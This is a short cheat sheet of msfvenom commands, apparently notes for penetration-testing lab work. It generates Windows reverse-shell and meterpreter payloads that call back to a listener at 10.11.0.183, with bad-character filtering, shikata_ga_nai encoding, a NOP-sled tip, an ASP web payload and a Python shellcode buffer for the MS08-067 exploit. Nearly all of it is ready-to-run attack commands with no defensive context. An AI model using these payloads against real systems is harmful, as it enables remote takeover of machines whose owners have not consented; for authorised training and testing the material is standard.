##list all payloads
msfvenom -l

##list formats
msfvenom --help-formats

## will generate shell code for a windows32 bit reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.183 LPORT=443 -f c -a x86 --platform windows
## msfvenom but with bad characters specified and the default shellcode encoder which is shikata_ga_nai
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.183 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai


sometimes adding "\x90"*16 which is a do nothing command is helpful to keep the shellcode from being overwritten.


##Creates an asp meterpreter session
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.183 LPORT=1337 -f asp > example.asp

##creates a buffer for ms08-067 python version
msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.183 LPORT=1337  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -v shellcode -f python
